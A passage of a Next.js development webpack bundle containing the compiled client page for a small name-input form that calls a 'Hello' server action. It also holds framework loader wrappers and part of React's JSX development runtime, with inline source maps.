(0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"button\", {\n                                type: \"submit\",\n                                disabled: loading || !input.trim(),\n                                className: \"w-full h-12 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] disabled:opacity-50 disabled:cursor-not-allowed font-medium\",\n                                children: loading ? 'Processing...' : 'Submit'\n                            }, void 0, false, {\n                                fileName: \"/app/app/page.tsx\",\n                                lineNumber: 45,\n                                columnNumber: 13\n                            }, this)\n                        ]\n                    }, void 0, true, {\n                        fileName: \"/app/app/page.tsx\",\n                        lineNumber: 32,\n                        columnNumber: 11\n                    }, this),\n                    result && /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                        className: \"w-full mt-4 p-4 rounded-lg bg-zinc-100 dark:bg-zinc-800 border border-zinc-200 dark:border-zinc-700\",\n                        children: /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"p\", {\n                            className: \"text-lg font-mono text-black dark:text-zinc-50 break-all\",\n                            children: result\n                        }, void 0, false, {\n                            fileName: \"/app/app/page.tsx\",\n                            lineNumber: 56,\n                            columnNumber: 15\n                        }, this)\n                    }, void 0, false, {\n                        fileName: \"/app/app/page.tsx\",\n                        lineNumber: 55,\n                        columnNumber: 13\n                    }, this)\n                ]\n            }, void 0, true, {\n                fileName: \"/app/app/page.tsx\",\n                lineNumber: 27,\n                columnNumber: 9\n            }, this)\n        }, void 0, false, {\n            fileName: \"/app/app/page.tsx\",\n            lineNumber: 26,\n            columnNumber: 7\n        }, this)\n    }, void 0, false, {\n        fileName: \"/app/app/page.tsx\",\n        lineNumber: 25,\n        columnNumber: 5\n    }, this);\n}\n_s(Home, \"z8pJX7+ZVkub4UTWO73Y8Nx7lNY=\");\n_c = Home;\nvar _c;\n$RefreshReg$(_c, \"Home\");\n\n\n;\n    // Wrapped in an IIFE to avoid polluting the global scope\n    ;\n    (function () {\n        var _a, _b;\n        // Legacy CSS implementations will `eval` browser code in a Node.js context\n        // to extract CSS. For backwards compatibility, we need to check we're in a\n        // browser context before continuing.\n        if (typeof self !== 'undefined' &&\n            // No-JS mode does not inject these helpers:\n            '$RefreshHelpers$' in self) {\n            // @ts-ignore __webpack_module__ is global\n            var currentExports = module.exports;\n            // @ts-ignore __webpack_module__ is global\n            var prevSignature = (_b = (_a = module.hot.data) === null || _a === void 0 ? void 0 : _a.prevSignature) !== null && _b !== void 0 ? _b : null;\n            // This cannot happen in MainTemplate because the exports mismatch between\n            // templating and execution.\n            self.$RefreshHelpers$.registerExportsForReactRefresh(currentExports, module.id);\n            // A module can be accepted automatically based on its exports, e.g. when\n            // it is a Refresh Boundary.\n            if (self.$RefreshHelpers$.isReactRefreshBoundary(currentExports)) {\n                // Save the previous exports signature on update so we can compare the boundary\n                // signatures. We avoid saving exports themselves since it causes memory leaks (https://github.com/vercel/next.js/pull/53797)\n                module.hot.dispose(function (data) {\n                    data.prevSignature =\n                        self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports);\n                });\n                // Unconditionally accept an update to this module, we'll check if it's\n                // still a Refresh Boundary later.\n                // @ts-ignore importMeta is replaced in the loader\n                module.hot.accept();\n                // This field is set when the previous version of this module was a\n                // Refresh Boundary, letting us know we need to check for invalidation or\n                // enqueue an update.\n                if (prevSignature !== null) {\n                    // A boundary can become ineligible if its exports are incompatible\n                    // with the previous exports.\n                    //\n                    // For example, if you add/remove/change exports, we'll want to\n                    // re-execute the importing modules, and force those components to\n                    // re-render. Similarly, if you convert a class component to a\n                    // function, we want to invalidate the boundary.\n                    if (self.$RefreshHelpers$.shouldInvalidateReactRefreshBoundary(prevSignature, self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports))) {\n                        module.hot.invalidate();\n                    }\n                    else {\n                        self.$RefreshHelpers$.scheduleUpdate();\n                    }\n                }\n            }\n            else {\n                // Since we just executed the code for the module, it's possible that the\n                // new exports made it ineligible for being a boundary.\n                // We only care about the case when we were _previously_ a boundary,\n                // because we already accepted this update (accidental side effect).\n                var isNoLongerABoundary = prevSignature !== null;\n                if (isNoLongerABoundary) {\n                    module.hot.invalidate();\n                }\n            }\n        }\n    })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL2FwcC9wYWdlLnRzeCIsIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7O0FBRWlDO0FBQ0M7QUFFbkIsU0FBU0U7O0lBQ3RCLE1BQU0sQ0FBQ0MsT0FBT0MsU0FBUyxHQUFHSiwrQ0FBUUEsQ0FBQztJQUNuQyxNQUFNLENBQUNLLFFBQVFDLFVBQVUsR0FBR04sK0NBQVFBLENBQUM7SUFDckMsTUFBTSxDQUFDTyxTQUFTQyxXQUFXLEdBQUdSLCtDQUFRQSxDQUFDO0lBRXZDLGVBQWVTLGFBQWFDLENBQW1DO1FBQzdEQSxFQUFFQyxjQUFjO1FBQ2hCSCxXQUFXO1FBQ1gsSUFBSTtZQUNGLE1BQU1JLFNBQVMsTUFBTVgsK0NBQUtBLENBQUNFO1lBQzNCRyxVQUFVTTtRQUNaLEVBQUUsT0FBT0MsT0FBTztZQUNkUCxVQUFVLFlBQWFPLENBQUFBLGlCQUFpQkMsUUFBUUQsTUFBTUUsT0FBTyxHQUFHLGVBQWM7UUFDaEYsU0FBVTtZQUNSUCxXQUFXO1FBQ2I7SUFDRjtJQUVBLHFCQUNFLDhEQUFDUTtRQUFJQyxXQUFVO2tCQUNiLDRFQUFDQztZQUFLRCxXQUFVO3NCQUNkLDRFQUFDRDtnQkFBSUMsV0FBVTs7a0NBQ2IsOERBQUNFO3dCQUFHRixXQUFVO2tDQUFnRjs7Ozs7O2tDQUk5Riw4REFBQ0c7d0JBQUtDLFVBQVVaO3dCQUFjUSxXQUFVOzswQ0FDdEMsOERBQUNEO2dDQUFJQyxXQUFVOzBDQUNiLDRFQUFDZDtvQ0FDQ21CLElBQUc7b0NBQ0hDLE1BQUs7b0NBQ0xDLE9BQU9yQjtvQ0FDUHNCLFVBQVUsQ0FBQ2YsSUFBTU4sU0FBU00sRUFBRWdCLE1BQU0sQ0FBQ0YsS0FBSztvQ0FDeENHLGFBQVk7b0NBQ1pWLFdBQVU7b0NBQ1ZXLFVBQVVyQjs7Ozs7Ozs7Ozs7MENBSWQsOERBQUNzQjtnQ0FDQ04sTUFBSztnQ0FDTEssVUFBVXJCLFdBQVcsQ0FBQ0osTUFBTTJCLElBQUk7Z0NBQ2hDYixXQUFVOzBDQUVUVixVQUFVLGtCQUFrQjs7Ozs7Ozs7Ozs7O29CQUloQ0Ysd0JBQ0MsOERBQUNXO3dCQUFJQyxXQUFVO2tDQUNiLDRFQUFDYzs0QkFBRWQsV0FBVTtzQ0FBNERaOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFPdkY7R0F6RHdCSDtLQUFBQSIsInNvdXJjZXMiOlsiL2FwcC9hcHAvcGFnZS50c3giXSwic291cmNlc0NvbnRlbnQiOlsiJ3VzZSBjbGllbnQnXG5cbmltcG9ydCB7IHVzZVN0YXRlIH0gZnJvbSAncmVhY3QnO1xuaW1wb3J0IHsgSGVsbG8gfSBmcm9tICcuL2FjdGlvbnMnO1xuXG5leHBvcnQgZGVmYXVsdCBmdW5jdGlvbiBIb21lKCkge1xuICBjb25zdCBbaW5wdXQsIHNldElucHV0XSA9IHVzZVN0YXRlKCcnKTtcbiAgY29uc3QgW3Jlc3VsdCwgc2V0UmVzdWx0XSA9IHVzZVN0YXRlKCcnKTtcbiAgY29uc3QgW2xvYWRpbmcsIHNldExvYWRpbmddID0gdXNlU3RhdGUoZmFsc2UpO1xuXG4gIGFzeW5jIGZ1bmN0aW9uIGhhbmRsZVN1Ym1pdChlOiBSZWFjdC5Gb3JtRXZlbnQ8SFRNTEZvcm1FbGVtZW50Pikge1xuICAgIGUucHJldmVudERlZmF1bHQoKTtcbiAgICBzZXRMb2FkaW5nKHRydWUpO1xuICAgIHRyeSB7XG4gICAgICBjb25zdCBvdXRwdXQgPSBhd2FpdCBIZWxsbyhpbnB1dCk7XG4gICAgICBzZXRSZXN1bHQob3V0cHV0KTtcbiAgICB9IGNhdGNoIChlcnJvcikge1xuICAgICAgc2V0UmVzdWx0KCdFcnJvcjogJyArIChlcnJvciBpbnN0YW5jZW9mIEVycm9yID8gZXJyb3IubWVzc2FnZSA6ICdVbmtub3duIGVycm9yJykpO1xuICAgIH0gZmluYWxseSB7XG4gICAgICBzZXRMb2FkaW5nKGZhbHNlKTtcbiAgICB9XG4gIH1cblxuICByZXR1cm4gKFxuICAgIDxkaXYgY2xhc3NOYW1lPVwiZmxleCBtaW4taC1zY3JlZW4gaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIGJnLXppbmMtNTAgZm9udC1zYW5zIGRhcms6YmctYmxhY2tcIj5cbiAgICAgIDxtYWluIGNsYXNzTmFtZT1cImZsZXggbWluLWgtc2NyZWVuIHctZnVsbCBtYXgtdy0zeGwgZmxleC1jb2wgaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIHB5LTMyIHB4LTE2IGJnLXdoaXRlIGRhcms6YmctYmxhY2tcIj5cbiAgICAgICAgPGRpdiBjbGFzc05hbWU9XCJmbGV4IGZsZXgtY29sIGl0ZW1zLWNlbnRlciBnYXAtOCB0ZXh0LWNlbnRlciB3LWZ1bGwgbWF4LXctbWRcIj5cbiAgICAgICAgICA8aDEgY2xhc3NOYW1lPVwidGV4dC0zeGwgZm9udC1zZW1pYm9sZCBsZWFkaW5nLTEwIHRyYWNraW5nLXRpZ2h0IHRleHQtYmxhY2sgZGFyazp0ZXh0LXppbmMtNTBcIj5cbiAgICAgICAgICAgIFdlbGNvbWUgdG8gdGhlIGNoYWxsZW5nZVxuICAgICAgICAgIDwvaDE+XG4gICAgICAgICAgXG4gICAgICAgICAgPGZvcm0gb25TdWJtaXQ9e2hhbmRsZVN1Ym1pdH0gY2xhc3NOYW1lPVwidy1mdWxsIGZsZXggZmxleC1jb2wgZ2FwLTRcIj5cbiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPVwiZmxleCBmbGV4LWNvbCBnYXAtMlwiPlxuICAgICAgICAgICAgICA8aW5wdXRcbiAgICAgICAgICAgICAgICBpZD1cImlucHV0XCJcbiAgICAgICAgICAgICAgICB0eXBlPVwidGV4dFwiXG4gICAgICAgICAgICAgICAgdmFsdWU9e2lucHV0fVxuICAgICAgICAgICAgICAgIG9uQ2hhbmdlPXsoZSkgPT4gc2V0SW5wdXQoZS50YXJnZXQudmFsdWUpfVxuICAgICAgICAgICAgICAgIHBsYWNlaG9sZGVyPVwiV2hhdCdzIHlvdXIgbmFtZT9cIlxuICAgICAgICAgICAgICAgIGNsYXNzTmFtZT1cInctZnVsbCBweC00IHB5LTMgcm91bmRlZC1sZyBib3JkZXIgYm9yZGVyLXppbmMtMzAwIGRhcms6Ym9yZGVyLXppbmMtNzAwIGJnLXdoaXRlIGRhcms6YmctemluYy05MDAgdGV4dC1ibGFjayBkYXJrOnRleHQtemluYy01MCBmb2N1czpvdXRsaW5lLW5vbmUgZm9jdXM6cmluZy0yIGZvY3VzOnJpbmctemluYy01MDAgZGFyazpmb2N1czpyaW5nLXppbmMtNDAwXCJcbiAgICAgICAgICAgICAgICBkaXNhYmxlZD17bG9hZGluZ31cbiAgICAgICAgICAgICAgLz5cbiAgICAgICAgICAgIDwvZGl2PlxuICAgICAgICAgICAgXG4gICAgICAgICAgICA8YnV0dG9uXG4gICAgICAgICAgICAgIHR5cGU9XCJzdWJtaXRcIlxuICAgICAgICAgICAgICBkaXNhYmxlZD17bG9hZGluZyB8fCAhaW5wdXQudHJpbSgpfVxuICAgICAgICAgICAgICBjbGFzc05hbWU9XCJ3LWZ1bGwgaC0xMiByb3VuZGVkLWZ1bGwgYmctZm9yZWdyb3VuZCBweC01IHRleHQtYmFja2dyb3VuZCB0cmFuc2l0aW9uLWNvbG9ycyBob3ZlcjpiZy1bIzM4MzgzOF0gZGFyazpob3ZlcjpiZy1bI2NjY10gZGlzYWJsZWQ6b3BhY2l0eS01MCBkaXNhYmxlZDpjdXJzb3Itbm90LWFsbG93ZWQgZm9udC1tZWRpdW1cIlxuICAgICAgICAgICAgPlxuICAgICAgICAgICAgICB7bG9hZGluZyA/ICdQcm9jZXNzaW5nLi4uJyA6ICdTdWJtaXQnfVxuICAgICAgICAgICAgPC9idXR0b24+XG4gICAgICAgICAgPC9mb3JtPlxuXG4gICAgICAgICAge3Jlc3VsdCAmJiAoXG4gICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT1cInctZnVsbCBtdC00IHAtNCByb3VuZGVkLWxnIGJnLXppbmMtMTAwIGRhcms6YmctemluYy04MDAgYm9yZGVyIGJvcmRlci16aW5jLTIwMCBkYXJrOmJvcmRlci16aW5jLTcwMFwiPlxuICAgICAgICAgICAgICA8cCBjbGFzc05hbWU9XCJ0ZXh0LWxnIGZvbnQtbW9ubyB0ZXh0LWJsYWNrIGRhcms6dGV4dC16aW5jLTUwIGJyZWFrLWFsbFwiPntyZXN1bHR9PC9wPlxuICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgKX1cbiAgICAgICAgPC9kaXY+XG4gICAgICA8L21haW4+XG4gICAgPC9kaXY+XG4gICk7XG59XG4iXSwibmFtZXMiOlsidXNlU3RhdGUiLCJIZWxsbyIsIkhvbWUiLCJpbnB1dCIsInNldElucHV0IiwicmVzdWx0Iiwic2V0UmVzdWx0IiwibG9hZGluZyIsInNldExvYWRpbmciLCJoYW5kbGVTdWJtaXQiLCJlIiwicHJldmVudERlZmF1bHQiLCJvdXRwdXQiLCJlcnJvciIsIkVycm9yIiwibWVzc2FnZSIsImRpdiIsImNsYXNzTmFtZSIsIm1haW4iLCJoMSIsImZvcm0iLCJvblN1Ym1pdCIsImlkIiwidHlwZSIsInZhbHVlIiwib25DaGFuZ2UiLCJ0YXJnZXQiLCJwbGFjZWhvbGRlciIsImRpc2FibGVkIiwiYnV0dG9uIiwidHJpbSIsInAiXSwiaWdub3JlTGlzdCI6W10sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///(app-pages-browser)/./app/page.tsx\n"));

/***/ }),

/***/ "(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-client-entry-loader.js?modules=%7B%22request%22%3A%22%2Fapp%2Fapp%2Fpage.tsx%22%2C%22ids%22%3A%5B%5D%7D&server=false!":
/*!**************************************************************************************************************************************************************************************************************************************************************************************!*\
  !*** ./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-client-entry-loader.js?modules=%7B%22request%22%3A%22%2Fapp%2Fapp%2Fpage.tsx%22%2C%22ids%22%3A%5B%5D%7D&server=false! ***!
  \**************************************************************************************************************************************************************************************************************************************************************************************/
/***/ ((__unused_webpack_module, __unused_webpack_exports, __webpack_require__) => {

eval(__webpack_require__.ts("Promise.resolve(/*! import() eager */).then(__webpack_require__.bind(__webpack_require__, /*! ./app/page.tsx */ \"(app-pages-browser)/./app/page.tsx\"));\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL25vZGVfbW9kdWxlcy8ucG5wbS9uZXh0QDE2LjAuNl9AYmFiZWwrY29yZUA3LjI4LjVfcmVhY3QtZG9tQDE5LjIuMF9yZWFjdEAxOS4yLjBfX3JlYWN0QDE5LjIuMC9ub2RlX21vZHVsZXMvbmV4dC9kaXN0L2J1aWxkL3dlYnBhY2svbG9hZGVycy9uZXh0LWZsaWdodC1jbGllbnQtZW50cnktbG9hZGVyLmpzP21vZHVsZXM9JTdCJTIycmVxdWVzdCUyMiUzQSUyMiUyRmFwcCUyRmFwcCUyRnBhZ2UudHN4JTIyJTJDJTIyaWRzJTIyJTNBJTVCJTVEJTdEJnNlcnZlcj1mYWxzZSEiLCJtYXBwaW5ncyI6IkFBQUEsc0pBQXNEIiwic291cmNlcyI6WyIiXSwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0KC8qIHdlYnBhY2tNb2RlOiBcImVhZ2VyXCIgKi8gXCIvYXBwL2FwcC9wYWdlLnRzeFwiKTtcbiJdLCJuYW1lcyI6W10sImlnbm9yZUxpc3QiOltdLCJzb3VyY2VSb290IjoiIn0=\n//# sourceURL=webpack-internal:///(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-client-entry-loader.js?modules=%7B%22request%22%3A%22%2Fapp%2Fapp%2Fpage.tsx%22%2C%22ids%22%3A%5B%5D%7D&server=false!\n"));

/***/ }),

/***/ "(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-loader/action-client-wrapper.js":
/*!************************************************************************************************************************************************************************************************!*\
  !*** ./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-loader/action-client-wrapper.js ***!
  \************************************************************************************************************************************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";
eval(__webpack_require__.ts("// This file must be bundled in the app's client layer, it shouldn't be directly\n// imported by the server.\n\nObject.defineProperty(exports, \"__esModule\", ({\n    value: true\n}));\n0 && (0);\nfunction _export(target, all) {\n    for(var name in all)Object.defineProperty(target, name, {\n        enumerable: true,\n        get: all[name]\n    });\n}\n_export(exports, {\n    callServer: function() {\n        return _appcallserver.callServer;\n    },\n    createServerReference: function() {\n        return _client.createServerReference;\n    },\n    findSourceMapURL: function() {\n        return _appfindsourcemapurl.findSourceMapURL;\n    }\n});\nconst _appcallserver = __webpack_require__(/*! next/dist/client/app-call-server */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/client/app-call-server.js\");\nconst _appfindsourcemapurl = __webpack_require__(/*! next/dist/client/app-find-source-map-url */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/client/app-find-source-map-url.js\");\nconst _client = __webpack_require__(/*! react-server-dom-webpack/client */ \"(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react-server-dom-webpack/client.browser.js\");\n\n//# sourceMappingURL=action-client-wrapper.js.map//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwcC1wYWdlcy1icm93c2VyKS8uL25vZGVfbW9kdWxlcy8ucG5wbS9uZXh0QDE2LjAuNl9AYmFiZWwrY29yZUA3LjI4LjVfcmVhY3QtZG9tQDE5LjIuMF9yZWFjdEAxOS4yLjBfX3JlYWN0QDE5LjIuMC9ub2RlX21vZHVsZXMvbmV4dC9kaXN0L2J1aWxkL3dlYnBhY2svbG9hZGVycy9uZXh0LWZsaWdodC1sb2FkZXIvYWN0aW9uLWNsaWVudC13cmFwcGVyLmpzIiwibWFwcGluZ3MiOiJBQUFBO0FBQ0E7QUFDYTtBQUNiLDhDQUE2QztBQUM3QztBQUNBLENBQUMsRUFBQztBQUNGLE1BQU0sQ0FJTDtBQUNEO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsS0FBSztBQUNMO0FBQ0E7QUFDQTtBQUNBO0FBQ0EsS0FBSztBQUNMO0FBQ0E7QUFDQSxLQUFLO0FBQ0w7QUFDQTtBQUNBO0FBQ0EsQ0FBQztBQUNELHVCQUF1QixtQkFBTyxDQUFDLDhNQUFrQztBQUNqRSw2QkFBNkIsbUJBQU8sQ0FBQyw4TkFBMEM7QUFDL0UsZ0JBQWdCLG1CQUFPLENBQUMsdU9BQWlDOztBQUV6RCIsInNvdXJjZXMiOlsiL2FwcC9ub2RlX21vZHVsZXMvLnBucG0vbmV4dEAxNi4wLjZfQGJhYmVsK2NvcmVANy4yOC41X3JlYWN0LWRvbUAxOS4yLjBfcmVhY3RAMTkuMi4wX19yZWFjdEAxOS4yLjAvbm9kZV9tb2R1bGVzL25leHQvZGlzdC9idWlsZC93ZWJwYWNrL2xvYWRlcnMvbmV4dC1mbGlnaHQtbG9hZGVyL2FjdGlvbi1jbGllbnQtd3JhcHBlci5qcyJdLCJzb3VyY2VzQ29udGVudCI6WyIvLyBUaGlzIGZpbGUgbXVzdCBiZSBidW5kbGVkIGluIHRoZSBhcHAncyBjbGllbnQgbGF5ZXIsIGl0IHNob3VsZG4ndCBiZSBkaXJlY3RseVxuLy8gaW1wb3J0ZWQgYnkgdGhlIHNlcnZlci5cblwidXNlIHN0cmljdFwiO1xuT2JqZWN0LmRlZmluZVByb3BlcnR5KGV4cG9ydHMsIFwiX19lc01vZHVsZVwiLCB7XG4gICAgdmFsdWU6IHRydWVcbn0pO1xuMCAmJiAobW9kdWxlLmV4cG9ydHMgPSB7XG4gICAgY2FsbFNlcnZlcjogbnVsbCxcbiAgICBjcmVhdGVTZXJ2ZXJSZWZlcmVuY2U6IG51bGwsXG4gICAgZmluZFNvdXJjZU1hcFVSTDogbnVsbFxufSk7XG5mdW5jdGlvbiBfZXhwb3J0KHRhcmdldCwgYWxsKSB7XG4gICAgZm9yKHZhciBuYW1lIGluIGFsbClPYmplY3QuZGVmaW5lUHJvcGVydHkodGFyZ2V0LCBuYW1lLCB7XG4gICAgICAgIGVudW1lcmFibGU6IHRydWUsXG4gICAgICAgIGdldDogYWxsW25hbWVdXG4gICAgfSk7XG59XG5fZXhwb3J0KGV4cG9ydHMsIHtcbiAgICBjYWxsU2VydmVyOiBmdW5jdGlvbigpIHtcbiAgICAgICAgcmV0dXJuIF9hcHBjYWxsc2VydmVyLmNhbGxTZXJ2ZXI7XG4gICAgfSxcbiAgICBjcmVhdGVTZXJ2ZXJSZWZlcmVuY2U6IGZ1bmN0aW9uKCkge1xuICAgICAgICByZXR1cm4gX2NsaWVudC5jcmVhdGVTZXJ2ZXJSZWZlcmVuY2U7XG4gICAgfSxcbiAgICBmaW5kU291cmNlTWFwVVJMOiBmdW5jdGlvbigpIHtcbiAgICAgICAgcmV0dXJuIF9hcHBmaW5kc291cmNlbWFwdXJsLmZpbmRTb3VyY2VNYXBVUkw7XG4gICAgfVxufSk7XG5jb25zdCBfYXBwY2FsbHNlcnZlciA9IHJlcXVpcmUoXCJuZXh0L2Rpc3QvY2xpZW50L2FwcC1jYWxsLXNlcnZlclwiKTtcbmNvbnN0IF9hcHBmaW5kc291cmNlbWFwdXJsID0gcmVxdWlyZShcIm5leHQvZGlzdC9jbGllbnQvYXBwLWZpbmQtc291cmNlLW1hcC11cmxcIik7XG5jb25zdCBfY2xpZW50ID0gcmVxdWlyZShcInJlYWN0LXNlcnZlci1kb20td2VicGFjay9jbGllbnRcIik7XG5cbi8vIyBzb3VyY2VNYXBwaW5nVVJMPWFjdGlvbi1jbGllbnQtd3JhcHBlci5qcy5tYXAiXSwibmFtZXMiOltdLCJpZ25vcmVMaXN0IjpbMF0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/build/webpack/loaders/next-flight-loader/action-client-wrapper.js\n"));

/***/ }),

/***/ "(app-pages-browser)/./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/cjs/react-jsx-dev-runtime.development.js":
/*!**************************************************************************************************************************************************************************************!*\
  !*** ./node_modules/.pnpm/next@16.0.6_@babel+core@7.28.5_react-dom@19.2.0_react@19.2.0__react@19.2.0/node_modules/next/dist/compiled/react/cjs/react-jsx-dev-runtime.development.js ***!
  \**************************************************************************************************************************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";
eval(__webpack_require__.ts("/**\n * @license React\n * react-jsx-dev-runtime.development.js\n *\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * This source code is licensed under the MIT license found in the\n * LICENSE file in the root directory of this source tree.\n */\n\n\n true &&\n  (function () {\n    function getComponentNameFromType(type) {\n      if (null == type) return null;\n      if (\"function\" === typeof type)\n        return type.$$typeof === REACT_CLIENT_REFERENCE\n          ? null\n          : type.displayName || type.name || null;\n      if (\"string\" === typeof type) return type;\n      switch (type) {\n        case REACT_FRAGMENT_TYPE:\n          return \"Fragment\";\n        case REACT_PROFILER_TYPE:\n          return \"Profiler\";\n        case REACT_STRICT_MODE_TYPE:\n          return \"StrictMode\";\n        case REACT_SUSPENSE_TYPE:\n          return \"Suspense\";\n        case REACT_SUSPENSE_LIST_TYPE:\n          return \"SuspenseList\";\n        case REACT_ACTIVITY_TYPE:\n          return \"Activity\";\n        case REACT_VIEW_TRANSITION_TYPE:\n          return \"ViewTransition\";\n      }\n      if (\"object\" === typeof type)\n        switch (\n          (\"number\" === typeof type.tag &&\n            console.error(\n              \"Received an unexpected object in getComponentNameFromType(). This is likely a bug in React. Please file an issue.\"\n            ),\n          type.$$typeof)\n        ) {\n          case REACT_PORTAL_TYPE:\n            return \"Portal\";\n          case REACT_CONTEXT_TYPE:\n            return type.displayName || \"Context\";\n          case REACT_CONSUMER_TYPE:\n            return (type._context.displayName || \"Context\") + \".Consumer\";\n          case REACT_FORWARD_REF_TYPE:\n            var innerType = type.render;\n            type = type.displayName;\n            type ||\n              ((type = innerType.displayName || innerType.name || \"\"),\n              (type = \"\" !== type ? \"ForwardRef(\" + type + \")\" : \"ForwardRef\"));\n            return type;\n          case REACT_MEMO_TYPE:\n            return (\n              (innerType = type.displayName || null),\n              null !== innerType\n                ? innerType\n                : getComponentNameFromType(type.type) || \"Memo\"\n            );\n          case REACT_LAZY_TYPE:\n            innerType = type._payload;\n            type = type._init;\n            try {\n              return getComponentNameFromType(type(innerType));\n            } catch (x) {}\n        }\n      return null;\n    }\n    function testStringCoercion(value) {\n      return \"\" + value;\n    }\n    function checkKeyStringCoercion(value) {\n      try {\n        testStringCoercion(value);\n        var JSCompiler_inline_result = !1;\n      } catch (e) {\n        JSCompiler_inline_result = !0;\n      }\n      if (JSCompiler_inline_result) {\n        JSCompiler_inline_result = console;\n        var JSCompiler_temp_const = JSCompiler_inline_result.error;\n        var JSCompiler_inline_result$jscomp$0 =\n          (\"function\" === typeof Symbol &&\n            Symbol.toStringTag &&\n            value[Symbol.toStringTag]) ||\n          value.constructor.name ||\n          \"Object\";\n        JSCompiler_temp_const.call(\n          JSCompiler_inline_result,\n          \"The provided key is an unsupported type %s. This value must be coerced to a string before using it here.\",\n          JSCompiler_inline_result$jscomp$0\n        );\n        return testStringCoercion(value);\n      }\n    }\n    function getTaskName(type) {\n      if (type === REACT_FRAGMENT_TYPE) return \"<>\";\n      if (\n        \"object\" === typeof type &&\n        null !== type &&\n        type.$$typeof === REACT_LAZY_TYPE\n      )\n        return \"<...>\";\n      try {\n        var name = getComponentNameFromType(type);\n        return name ? \"<\" + name + \">\" : \"<...>\";\n      } catch (x) {\n        return \"<...>\";\n      }\n    }\n    function getOwner() {\n      var dispatcher = ReactSharedInternals.A;\n      return null === dispatcher ? null : dispatcher.getOwner();\n    }\n    function UnknownOwner() {\n      return Error(\"react-stack-top-frame\");\n    }\n    function hasValidKey(config) {\n      if (hasOwnProperty.call(config, \"key\")) {\n        var getter = Object.getOwnPropertyDescriptor(config, \"key\").get;\n        if (getter && getter.isReactWarning) return !1;\n      }\n      return void 0 !== config.key;\n    }\n    function defineKeyPropWarningGetter(props, displayName) {\n      function warnAboutAccessingKey() {\n        specialPropKeyWarningShown ||\n          ((specialPropKeyWarningShown = !0),\n          console.error(\n            \"%s: `key` is not a prop. Trying to access it will result in `undefined` being returned. If you need to access the same value within the child component, you should pass it as a different prop. (https://react.dev/link/special-props)\",\n            displayName\n          ));\n      }\n      warnAboutAccessingKey.isReactWarning = !0;\n      Object.defineProperty(props, \"key\", {\n        get: warnAboutAccessingKey,\n        configurable: !0\n      });\n    }\n    function elementRefGetterWithDeprecationWarning() {\n      var componentName = getComponentNameFromType(this.type);\n      didWarnAboutElementRef[componentName] ||\n        ((didWarnAboutElementRef[componentName] = !0),\n        console.error(\n          \"Accessing element.ref was removed in React 19. ref is now a regular prop. It will be removed from the JSX Element type in a future release.\"\n        ));\n      componentName = this.props.ref;\n      return void 0 !== componentName ? componentName : null;\n    }\n    function ReactElement(type, key, props, owner, debugStack, debugTask) {\n      var refProp = props.ref;\n      type = {\n        $$typeof: REACT_ELEMENT_TYPE,\n        type: type,\n        key: key,\n        props: props,\n        _owner: owner\n      };\n      null !== (void 0 !== refProp ? refProp : null)\n        ? Object.defineProperty(type, \"ref\", {\n            enumerable: !1,\n            get: elementRefGetterWithDeprecationWarning\n          })\n        : Object.defineProperty(type, \"ref\", { enumerable: !1, 